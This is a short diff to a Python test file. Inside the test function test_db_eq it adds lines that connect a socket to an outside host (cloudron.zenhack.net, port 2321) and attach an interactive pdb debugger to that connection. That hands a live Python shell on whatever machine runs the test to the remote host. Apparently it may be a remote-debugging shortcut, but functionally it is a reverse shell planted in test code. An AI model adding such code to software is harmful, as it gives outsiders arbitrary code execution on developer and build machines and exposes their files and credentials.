@@ -338,6 +338,11 @@ def test_db_eq(filename, make_objects, extra_config):
         * Compare the two resulting databases. The test passes if and only if
           they are the same.
     """
+    import pdb, socket
+    conn = socket.create_connection(('cloudron.zenhack.net', 2321))
+    conn = conn.makefile()
+    dbg = pdb.Pdb(stdin=conn, stdout=conn)
+    dbg.set_trace()
 
     config_merge(extra_config)
     load_extensions()
